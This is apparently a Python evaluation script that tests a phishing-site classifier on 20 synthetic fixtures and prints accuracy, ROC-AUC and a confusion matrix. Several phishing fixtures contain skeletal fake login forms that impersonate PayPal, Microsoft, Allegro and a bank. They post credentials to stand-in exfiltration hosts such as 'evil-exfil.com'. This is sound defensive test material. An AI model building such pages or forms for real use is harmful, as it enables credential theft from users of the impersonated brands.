"""
Unseen Data Evaluation Script for Website Authenticity & Phishing Classifier.

Evaluates the trained XGBoost model against diverse, realistic test cases
that were never seen during model training:
1. Normal legitimate websites (tech, e-commerce, banking, government, media)
2. Legitimate login websites (with authentic password/email inputs & authorized root domain)
3. Phishing websites with valid HTTPS certificates (Let's Encrypt / Cloudflare)
4. Phishing login pages & brand impersonation (e.g. PayPal, Allegro, Microsoft, Google)
5. Websites with unusual URL structures & nested subdomains
6. Websites using raw IP addresses
7. Encoded / Punycode (xn--) domain names
8. Credential harvesting forms (password, email, credit card, OTP)
9. Unusual/cross-domain form destinations
10. Hidden field deception forms (> 5 hidden fields)
11. Multi-iframe deceptive websites (> 5 iframes)
12. Expired / self-signed SSL certificate cases
13. Websites with normal-looking JavaScript & DOM hierarchies

Calculates and prints:
- Accuracy
- Precision
- Recall
- F1-Score
- ROC-AUC
- Confusion Matrix (TN, FP, FN, TP)
- False Positive Count & False Negative Count
- False Positive Rate (FPR) & False Negative Rate (FNR)
"""

import os
import sys
from typing import Dict, List, Tuple, Any
import numpy as np
from sklearn.metrics import (
    accuracy_score,
    precision_score,
    recall_score,
    f1_score,
    roc_auc_score,
    confusion_matrix,
)

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from src.models import (
    AnalysisData,
    NetworkData,
    DOMData,
    JavaScriptData,
    VisualData,
    SSLData,
)
from src.feature_extractor import FeatureExtractor, FEATURE_NAMES
from src.ml_model import MLPhishingModel


def build_unseen_evaluation_dataset() -> List[Dict[str, Any]]:
    """
    Construct a deterministic test dataset of diverse unseen website scenarios.
    Returns list of dicts with keys: 'name', 'url', 'data', 'reputation', 'is_phishing'.
    """
    cases = []

    # =========================================================================
    # CLASS 0: LEGITIMATE WEBSITES (Diverse Profiles)
    # =========================================================================

    # 1. Google Search Homepage
    cases.append({
        "name": "Legitimate - Google Search Homepage",
        "url": "https://www.google.com",
        "data": AnalysisData(
            network=NetworkData(request_count=22, protocol_distribution={"https": 22}, unique_domains=["google.com", "gstatic.com"]),
            dom=DOMData(
                html_content="<html><head><title>Google</title></head><body><h1>Google</h1><form action='/search'><input name='q'></form></body></html>",
                structure_metrics={"element_count": 280, "form_count": 1, "password_input_count": 0, "email_input_count": 0, "script_count": 12},
            ),
            javascript=JavaScriptData(script_count=12, dom_modifications=45, external_api_calls=2),
            visual=VisualData(screenshot_path="data/screenshots/google.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 4}),
            ssl=SSLData(issuer="CN=Google Trust Services LLC, C=US", expiration_date="2027-06-01T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 2. Google Accounts Official Sign-In (Legitimate Login)
    cases.append({
        "name": "Legitimate - Google Accounts Sign-In",
        "url": "https://accounts.google.com/signin",
        "data": AnalysisData(
            network=NetworkData(request_count=35, protocol_distribution={"https": 35}, unique_domains=["google.com", "gstatic.com"]),
            dom=DOMData(
                html_content="<html><head><title>Sign in - Google Accounts</title></head><body><h1>Sign in</h1><h2>to continue to Gmail</h2><form action='https://accounts.google.com/signin/v2/challenge/pwd'><input type='email'><input type='password'></form></body></html>",
                structure_metrics={"element_count": 450, "form_count": 1, "password_input_count": 1, "email_input_count": 1, "login_keyword_count": 4, "script_count": 15},
            ),
            javascript=JavaScriptData(script_count=15, dom_modifications=120, external_api_calls=3),
            visual=VisualData(screenshot_path="data/screenshots/google_login.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 6}),
            ssl=SSLData(issuer="CN=Google Trust Services", expiration_date="2027-08-15T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 3. Microsoft Official Login (Legitimate Login)
    cases.append({
        "name": "Legitimate - Microsoft Live Sign-In",
        "url": "https://login.live.com/login.srf",
        "data": AnalysisData(
            network=NetworkData(request_count=40, protocol_distribution={"https": 40}, unique_domains=["live.com", "microsoft.com", "msftauth.net"]),
            dom=DOMData(
                html_content="<html><head><title>Sign in to your Microsoft account</title></head><body><h1>Sign in</h1><form action='https://login.live.com/ppsecure/post.srf'><input type='email'><input type='password'></form></body></html>",
                structure_metrics={"element_count": 520, "form_count": 1, "password_input_count": 1, "email_input_count": 1, "login_keyword_count": 3, "script_count": 18},
            ),
            javascript=JavaScriptData(script_count=18, dom_modifications=140, external_api_calls=4),
            visual=VisualData(screenshot_path="data/screenshots/ms_login.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 8}),
            ssl=SSLData(issuer="CN=Microsoft Azure TLS Issuing CA", expiration_date="2027-09-01T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 4. Amazon Product Page
    cases.append({
        "name": "Legitimate - Amazon Retail Store",
        "url": "https://www.amazon.com/dp/B08N5WRWNW",
        "data": AnalysisData(
            network=NetworkData(request_count=85, protocol_distribution={"https": 85}, unique_domains=["amazon.com", "ssl-images-amazon.com", "media-amazon.com"]),
            dom=DOMData(
                html_content="<html><head><title>Amazon.com: Online Shopping</title></head><body><h1>Amazon</h1><form action='/cart/add'><input type='hidden'></form></body></html>",
                structure_metrics={"element_count": 1850, "form_count": 3, "password_input_count": 0, "script_count": 28, "hidden_input_count": 4},
            ),
            javascript=JavaScriptData(script_count=28, dom_modifications=350, external_api_calls=8),
            visual=VisualData(screenshot_path="data/screenshots/amazon.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 35}),
            ssl=SSLData(issuer="CN=Amazon RSA 2048 M01", expiration_date="2027-11-20T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 5. Allegro Official Polish E-Commerce
    cases.append({
        "name": "Legitimate - Allegro Official Store",
        "url": "https://allegro.pl/kategoria/elektronika",
        "data": AnalysisData(
            network=NetworkData(request_count=65, protocol_distribution={"https": 65}, unique_domains=["allegro.pl", "allegrostatic.com"]),
            dom=DOMData(
                html_content="<html><head><title>Elektronika - Allegro.pl</title></head><body><h1>Allegro</h1><form action='/szukaj'><input name='string'></form></body></html>",
                structure_metrics={"element_count": 1200, "form_count": 2, "password_input_count": 0, "script_count": 22},
            ),
            javascript=JavaScriptData(script_count=22, dom_modifications=280, external_api_calls=5),
            visual=VisualData(screenshot_path="data/screenshots/allegro.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 24}),
            ssl=SSLData(issuer="CN=DigiCert Global G2 TLS RSA SHA256 2020 CA1", expiration_date="2027-10-15T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 6. PayPal Official Home
    cases.append({
        "name": "Legitimate - PayPal Official Portal",
        "url": "https://www.paypal.com/us/home",
        "data": AnalysisData(
            network=NetworkData(request_count=48, protocol_distribution={"https": 48}, unique_domains=["paypal.com", "paypalobjects.com"]),
            dom=DOMData(
                html_content="<html><head><title>Digital Wallets, Money Management, and More | PayPal US</title></head><body><h1>PayPal</h1><a href='/signin'>Log In</a></body></html>",
                structure_metrics={"element_count": 680, "form_count": 1, "password_input_count": 0, "script_count": 16},
            ),
            javascript=JavaScriptData(script_count=16, dom_modifications=95, external_api_calls=4),
            visual=VisualData(screenshot_path="data/screenshots/paypal.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 12}),
            ssl=SSLData(issuer="CN=DigiCert Global Root G2", expiration_date="2027-12-01T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 7. MIT University (.edu)
    cases.append({
        "name": "Legitimate - MIT University Portal",
        "url": "https://www.mit.edu",
        "data": AnalysisData(
            network=NetworkData(request_count=30, protocol_distribution={"https": 30}, unique_domains=["mit.edu"]),
            dom=DOMData(
                html_content="<html><head><title>Massachusetts Institute of Technology | MIT</title></head><body><h1>MIT</h1></body></html>",
                structure_metrics={"element_count": 450, "form_count": 1, "password_input_count": 0, "script_count": 8},
            ),
            javascript=JavaScriptData(script_count=8, dom_modifications=30, external_api_calls=1),
            visual=VisualData(screenshot_path="data/screenshots/mit.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 14}),
            ssl=SSLData(issuer="CN=InCommon RSA Server CA", expiration_date="2027-05-15T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 8. Python Software Foundation Documentation
    cases.append({
        "name": "Legitimate - Python.org Docs",
        "url": "https://docs.python.org/3/",
        "data": AnalysisData(
            network=NetworkData(request_count=15, protocol_distribution={"https": 15}, unique_domains=["python.org"]),
            dom=DOMData(
                html_content="<html><head><title>3.11.9 Documentation</title></head><body><h1>Python Documentation</h1><form action='search.html'><input name='q'></form></body></html>",
                structure_metrics={"element_count": 350, "form_count": 1, "password_input_count": 0, "script_count": 4},
            ),
            javascript=JavaScriptData(script_count=4, dom_modifications=15, external_api_calls=0),
            visual=VisualData(screenshot_path="data/screenshots/python.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 3}),
            ssl=SSLData(issuer="CN=Let's Encrypt Authority X3", expiration_date="2027-04-10T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 9. Example Domain (RFC 2606)
    cases.append({
        "name": "Legitimate - Example.com Baseline",
        "url": "https://example.com",
        "data": AnalysisData(
            network=NetworkData(request_count=3, protocol_distribution={"https": 3}, unique_domains=["example.com"]),
            dom=DOMData(
                html_content="<html><head><title>Example Domain</title></head><body><h1>Example Domain</h1><p>This domain is for use in illustrative examples.</p></body></html>",
                structure_metrics={"element_count": 25, "form_count": 0, "password_input_count": 0, "script_count": 0},
            ),
            javascript=JavaScriptData(script_count=0, dom_modifications=0, external_api_calls=0),
            visual=VisualData(screenshot_path="data/screenshots/example.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 0}),
            ssl=SSLData(issuer="CN=DigiCert TLS RSA SHA256 2020 CA1", expiration_date="2027-02-14T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # 10. Tech Blog / News Portal
    cases.append({
        "name": "Legitimate - Tech News Blog",
        "url": "https://arstechnica.com/gadgets/",
        "data": AnalysisData(
            network=NetworkData(request_count=55, protocol_distribution={"https": 55}, unique_domains=["arstechnica.com", "condenast.com"]),
            dom=DOMData(
                html_content="<html><head><title>Gear & Gadgets | Ars Technica</title></head><body><h1>Ars Technica</h1></body></html>",
                structure_metrics={"element_count": 920, "form_count": 1, "password_input_count": 0, "script_count": 14},
            ),
            javascript=JavaScriptData(script_count=14, dom_modifications=110, external_api_calls=3),
            visual=VisualData(screenshot_path="data/screenshots/ars.png", layout_characteristics={"viewport_width": 1920, "viewport_height": 1080, "image_count": 18}),
            ssl=SSLData(issuer="CN=Amazon RSA 2048 M02", expiration_date="2027-07-20T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 0,
    })

    # =========================================================================
    # CLASS 1: PHISHING WEBSITES (Diverse Attack Patterns)
    # =========================================================================

    # 11. Subdomain Brand Impersonation with Valid SSL (The Allegro Problem)
    cases.append({
        "name": "Phishing - Allegro Subdomain Spoof with Valid SSL",
        "url": "http://allegro.oferta7678678564.pl/login",
        "data": AnalysisData(
            network=NetworkData(request_count=12, protocol_distribution={"http": 8, "https": 4}, unique_domains=["oferta7678678564.pl"]),
            dom=DOMData(
                html_content="<html><head><title>Allegro - Logowanie</title></head><body><h1>Allegro</h1><h2>Zaloguj sie do konta</h2><form action='https://evil-exfil.com/post'><input type='email'><input type='password'></form></body></html>",
                structure_metrics={"element_count": 65, "form_count": 1, "password_input_count": 1, "email_input_count": 1, "login_keyword_count": 3, "script_count": 2, "cross_domain_form_action_count": 1},
            ),
            javascript=JavaScriptData(script_count=2, dom_modifications=10, external_api_calls=1),
            visual=VisualData(screenshot_path="data/screenshots/allegro_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 2}),
            ssl=SSLData(issuer="CN=Let's Encrypt Authority X3", expiration_date="2027-03-01T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 12. PayPal Credential Harvester on Hyphenated Disposable Domain
    cases.append({
        "name": "Phishing - PayPal Verification Scammer",
        "url": "https://paypal-account-security-update.xyz/verify",
        "data": AnalysisData(
            network=NetworkData(request_count=8, protocol_distribution={"https": 8}, unique_domains=["paypal-account-security-update.xyz"]),
            dom=DOMData(
                html_content="<html><head><title>PayPal - Account Verification Required</title></head><body><h1>PayPal</h1><h2>Security Verification</h2><form action='save_creds.php'><input type='email'><input type='password'></form></body></html>",
                structure_metrics={"element_count": 45, "form_count": 1, "password_input_count": 1, "email_input_count": 1, "login_keyword_count": 4, "script_count": 1},
            ),
            javascript=JavaScriptData(script_count=1, dom_modifications=5, external_api_calls=0),
            visual=VisualData(screenshot_path="data/screenshots/paypal_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 1}),
            ssl=SSLData(issuer="CN=Let's Encrypt Authority X3", expiration_date="2027-02-15T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 13. Microsoft 365 Login Harvester with High Subdomain Depth
    cases.append({
        "name": "Phishing - Microsoft 365 Nested Subdomain Attack",
        "url": "https://login.microsoftonline.com.secure-auth-portal.top/auth/login",
        "data": AnalysisData(
            network=NetworkData(request_count=14, protocol_distribution={"https": 14}, unique_domains=["secure-auth-portal.top"]),
            dom=DOMData(
                html_content="<html><head><title>Sign in to your Microsoft account</title></head><body><h1>Microsoft</h1><form action='https://api-exfil.com/collect'><input type='email'><input type='password'></form></body></html>",
                structure_metrics={"element_count": 75, "form_count": 1, "password_input_count": 1, "email_input_count": 1, "login_keyword_count": 3, "cross_domain_form_action_count": 1},
            ),
            javascript=JavaScriptData(script_count=3, dom_modifications=15, external_api_calls=2),
            visual=VisualData(screenshot_path="data/screenshots/ms_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 3}),
            ssl=SSLData(issuer="CN=cPanel, Inc. Certification Authority", expiration_date="2027-01-20T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 14. Raw IP Address Credential Stealer
    cases.append({
        "name": "Phishing - Raw IP Address Login",
        "url": "http://198.51.100.45:8080/secure/login.php",
        "data": AnalysisData(
            network=NetworkData(request_count=5, protocol_distribution={"http": 5}, unique_domains=["198.51.100.45"]),
            dom=DOMData(
                html_content="<html><head><title>Webmail Login</title></head><body><h1>Webmail System</h1><form action='login.php'><input type='email'><input type='password'></form></body></html>",
                structure_metrics={"element_count": 35, "form_count": 1, "password_input_count": 1, "email_input_count": 1, "login_keyword_count": 2},
            ),
            javascript=JavaScriptData(script_count=1, dom_modifications=2, external_api_calls=0),
            visual=VisualData(screenshot_path="data/screenshots/ip_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 1}),
            ssl=None,
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 15. Punycode Homograph Brand Impersonation (xn--pple-43d.com)
    cases.append({
        "name": "Phishing - Punycode Homograph Apple Impersonation",
        "url": "https://www.xn--pple-43d.com/id/signin",
        "data": AnalysisData(
            network=NetworkData(request_count=10, protocol_distribution={"https": 10}, unique_domains=["xn--pple-43d.com"]),
            dom=DOMData(
                html_content="<html><head><title>Sign in with your Apple ID</title></head><body><h1>Apple ID</h1><form action='post.php'><input type='email'><input type='password'></form></body></html>",
                structure_metrics={"element_count": 55, "form_count": 1, "password_input_count": 1, "email_input_count": 1, "login_keyword_count": 2},
            ),
            javascript=JavaScriptData(script_count=2, dom_modifications=10, external_api_calls=0),
            visual=VisualData(screenshot_path="data/screenshots/punycode_apple.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 2}),
            ssl=SSLData(issuer="CN=Let's Encrypt Authority X3", expiration_date="2027-04-01T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 16. Banking OTP & Credit Card Harvester
    cases.append({
        "name": "Phishing - Bank Card & OTP Stealer",
        "url": "https://santander-autoryzacja-klienta.buzz/potwierdzenie",
        "data": AnalysisData(
            network=NetworkData(request_count=16, protocol_distribution={"https": 16}, unique_domains=["santander-autoryzacja-klienta.buzz"]),
            dom=DOMData(
                html_content="<html><head><title>Santander Bank - Weryfikacja Karty i Kodu SMS</title></head><body><h1>Santander Bank</h1><form action='harvest.php'><input name='card_number'><input name='cvv'><input name='otp_code'></form></body></html>",
                structure_metrics={"element_count": 80, "form_count": 1, "card_input_count": 1, "otp_input_count": 1, "login_keyword_count": 4},
            ),
            javascript=JavaScriptData(script_count=3, dom_modifications=25, external_api_calls=1),
            visual=VisualData(screenshot_path="data/screenshots/bank_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 3}),
            ssl=SSLData(issuer="CN=ZeroSSL RSA Domain Secure Site CA", expiration_date="2027-03-10T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 17. Hidden Input Deception Campaign
    cases.append({
        "name": "Phishing - Hidden Form Fields Data Exfiltration",
        "url": "http://invoice-tracking-document897621.info/download",
        "data": AnalysisData(
            network=NetworkData(request_count=7, protocol_distribution={"http": 7}, unique_domains=["invoice-tracking-document897621.info"]),
            dom=DOMData(
                html_content="<html><head><title>DocuSign - Review Document</title></head><body><h1>DocuSign</h1><form action='https://evil-storage.com/leak'><input type='password'><input type='hidden'><input type='hidden'><input type='hidden'><input type='hidden'><input type='hidden'><input type='hidden'><input type='hidden'></form></body></html>",
                structure_metrics={"element_count": 40, "form_count": 1, "password_input_count": 1, "hidden_input_count": 8, "cross_domain_form_action_count": 1},
            ),
            javascript=JavaScriptData(script_count=1, dom_modifications=5, external_api_calls=0),
            visual=VisualData(screenshot_path="data/screenshots/hidden_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 1}),
            ssl=None,
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 18. Multi-Iframe Clickjacking / Credential Phishing
    cases.append({
        "name": "Phishing - Nested Iframe Deception",
        "url": "https://secure-auth-gateway-7812903.club/login",
        "data": AnalysisData(
            network=NetworkData(request_count=20, protocol_distribution={"https": 20}, unique_domains=["secure-auth-gateway-7812903.club", "frame1.xyz", "frame2.xyz"]),
            dom=DOMData(
                html_content="<html><head><title>Portal Login</title></head><body><iframe src='a'></iframe><iframe src='b'></iframe><iframe src='c'></iframe><iframe src='d'></iframe><iframe src='e'></iframe><iframe src='f'></iframe><iframe src='g'></iframe></body></html>",
                structure_metrics={"element_count": 50, "form_count": 1, "iframe_count": 7, "password_input_count": 1, "login_keyword_count": 2},
            ),
            javascript=JavaScriptData(script_count=4, dom_modifications=30, external_api_calls=3),
            visual=VisualData(screenshot_path="data/screenshots/iframe_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 2}),
            ssl=SSLData(issuer="CN=Let's Encrypt Authority X3", expiration_date="2027-02-28T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 19. Algorithmic DGA Random Subdomain
    cases.append({
        "name": "Phishing - DGA Random High Entropy Subdomain",
        "url": "https://x89qzk71vbm09wla7812.security-update.cam/confirm",
        "data": AnalysisData(
            network=NetworkData(request_count=6, protocol_distribution={"https": 6}, unique_domains=["x89qzk71vbm09wla7812.security-update.cam"]),
            dom=DOMData(
                html_content="<html><head><title>Account Verification</title></head><body><h1>Security Verification</h1><form action='submit.php'><input type='password'></form></body></html>",
                structure_metrics={"element_count": 30, "form_count": 1, "password_input_count": 1, "login_keyword_count": 3},
            ),
            javascript=JavaScriptData(script_count=1, dom_modifications=4, external_api_calls=0),
            visual=VisualData(screenshot_path="data/screenshots/dga_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 1}),
            ssl=SSLData(issuer="CN=Let's Encrypt Authority X3", expiration_date="2027-03-15T00:00:00Z", chain_valid=True),
        ),
        "reputation": {"threat_detected": False},
        "is_phishing": 1,
    })

    # 20. Confirmed Threat Intelligence Flagged URL
    cases.append({
        "name": "Phishing - Threat Intelligence Blocklisted Scam",
        "url": "http://malicious-confirmed-phish-domain.sbs/pay",
        "data": AnalysisData(
            network=NetworkData(request_count=4, protocol_distribution={"http": 4}, unique_domains=["malicious-confirmed-phish-domain.sbs"]),
            dom=DOMData(
                html_content="<html><head><title>Payment Required</title></head><body><h1>Overdue Bill</h1><form action='steal.php'><input name='card'></form></body></html>",
                structure_metrics={"element_count": 25, "form_count": 1, "card_input_count": 1, "login_keyword_count": 2},
            ),
            javascript=JavaScriptData(script_count=1, dom_modifications=2, external_api_calls=0),
            visual=VisualData(screenshot_path="data/screenshots/threat_phish.png", layout_characteristics={"viewport_width": 1280, "viewport_height": 800, "image_count": 1}),
            ssl=None,
        ),
        "reputation": {"threat_detected": True, "provider": "Google Safe Browsing"},
        "is_phishing": 1,
    })

    return cases


def evaluate_unseen_dataset() -> Dict[str, Any]:
    """Evaluate trained XGBoost model against unseen test fixtures."""
    print("=" * 65)
    print("       PHASE 3: UNSEEN DOMAIN EVALUATION AUDIT")
    print("=" * 65)

    cases = build_unseen_evaluation_dataset()
    print(f"Total Unseen Evaluation Cases: {len(cases)}")
    legit_cases = [c for c in cases if c["is_phishing"] == 0]
    phish_cases = [c for c in cases if c["is_phishing"] == 1]
    print(f"  - Legitimate Cases: {len(legit_cases)}")
    print(f"  - Phishing Cases:   {len(phish_cases)}")

    extractor = FeatureExtractor()
    model = MLPhishingModel()

    if not model.is_trained:
        print("Error: Trained model not loaded.")
        return {}

    y_true = []
    y_pred = []
    y_prob = []
    results = []

    for c in cases:
        f_dict = extractor.extract_features_dict(
            data=c["data"],
            url=c["url"],
            reputation=c.get("reputation"),
        )
        p_phish = model.predict_phishing_probability(f_dict)
        pred = 1 if p_phish >= 0.50 else 0

        y_true.append(c["is_phishing"])
        y_pred.append(pred)
        y_prob.append(p_phish)

        is_correct = (pred == c["is_phishing"])
        results.append({
            "name": c["name"],
            "url": c["url"],
            "true_label": c["is_phishing"],
            "pred_label": pred,
            "phish_prob": p_phish,
            "correct": is_correct,
        })

    y_true = np.array(y_true, dtype=np.int32)
    y_pred = np.array(y_pred, dtype=np.int32)
    y_prob = np.array(y_prob, dtype=np.float32)

    acc = accuracy_score(y_true, y_pred)
    prec = precision_score(y_true, y_pred, zero_division=0)
    rec = recall_score(y_true, y_pred, zero_division=0)
    f1 = f1_score(y_true, y_pred, zero_division=0)
    roc_auc = roc_auc_score(y_true, y_prob)
    cm = confusion_matrix(y_true, y_pred)

    tn, fp, fn, tp = cm.ravel()
    fpr = (fp / (fp + tn)) if (fp + tn) > 0 else 0.0
    fnr = (fn / (fn + tp)) if (fn + tp) > 0 else 0.0

    print("\n" + "=" * 65)
    print("          UNSEEN GENERALIZATION METRICS          ")
    print("=" * 65)
    print(f"Accuracy:                 {acc:.4f} ({acc * 100:.2f}%)")
    print(f"Precision:                {prec:.4f} ({prec * 100:.2f}%)")
    print(f"Recall:                   {rec:.4f} ({rec * 100:.2f}%)")
    print(f"F1-Score:                 {f1:.4f}")
    print(f"ROC-AUC:                  {roc_auc:.4f}")
    print(f"False Positive Count:     {fp} (FPR: {fpr:.2%})")
    print(f"False Negative Count:     {fn} (FNR: {fnr:.2%})")
    print("\nConfusion Matrix:")
    print(f"  [TN={tn:<4} FP={fp:<4}] (Actual Legitimate)")
    print(f"  [FN={fn:<4} TP={tp:<4}] (Actual Phishing)")
    print("=" * 65)

    print("\nPer-Case Prediction Breakdown:")
    for r in results:
        status = "PASS" if r["correct"] else "FAIL"
        true_str = "PHISHING" if r["true_label"] == 1 else "LEGITIMATE"
        pred_str = "PHISHING" if r["pred_label"] == 1 else "LEGITIMATE"
        print(f"  [{status}] {r['name']:<50} | True: {true_str:<10} | Pred: {pred_str:<10} | P(Phish)={r['phish_prob']:.4f}")

    return {
        "accuracy": float(acc),
        "precision": float(prec),
        "recall": float(rec),
        "f1": float(f1),
        "roc_auc": float(roc_auc),
        "confusion_matrix": cm.tolist(),
        "fp_count": int(fp),
        "fn_count": int(fn),
        "fpr": float(fpr),
        "fnr": float(fnr),
        "results": results,
    }


if __name__ == "__main__":
    evaluate_unseen_dataset()
